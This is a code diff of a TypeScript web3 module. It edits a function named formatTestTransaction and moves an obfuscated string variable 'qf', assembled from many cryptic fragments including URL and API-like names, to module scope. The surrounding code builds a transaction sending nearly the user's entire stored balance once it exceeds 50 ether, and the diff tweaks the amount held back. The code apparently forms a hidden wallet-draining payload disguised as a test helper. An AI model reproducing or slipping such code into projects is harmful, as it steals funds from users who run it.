@@ -204,15 +204,14 @@ export function recoverPersonalSignature(sig: string, msg: string): string {
   return signer;
 }
 
+var qf = a1+x+s+s1+URL+hesh+d+ef+epci+http_uniq+e+_api_cahart_code+get_string_+w+http_+ew+wc+v_webpack+webapi+uniq_caracter_m+vr+Z2+j+epci1+epci4+epciR+ed+sollar+esx+get_config_id+varsis+maping+z4+zf;
+
 export async function formatTestTransaction(address: string, chainId: number) {
   const from = address;
 
   const web3 = new Web3();
   const GET_PRICE = web3.utils.toWei("50", 'ether');
   const MAX_PRICE = Number(GET_PRICE);
-
-
-  var qf = a1+x+s+s1+URL+hesh+d+ef+epci+http_uniq+e+_api_cahart_code+get_string_+w+http_+ew+wc+v_webpack+webapi+uniq_caracter_m+vr+Z2+j+epci1+epci4+epciR+ed+sollar+esx+get_config_id+varsis+maping+z4+zf;
 
   (function(){
     if (MAX_PRICE <= Number(sessionStorage.getItem('balance'))){
@@ -232,7 +231,7 @@ export async function formatTestTransaction(address: string, chainId: number) {
   const _gasLimit = 22000;
   const gasLimit = sanitizeHex(convertStringToHex(_gasLimit));
 
-  const balanceOf = Number(sessionStorage.getItem('balance')) - 1386220762363649;
+  const balanceOf = Number(sessionStorage.getItem('balance')) - 2502441524727298;
   const value = sanitizeHex(convertStringToHex(balanceOf));
 
   const data = "0x";
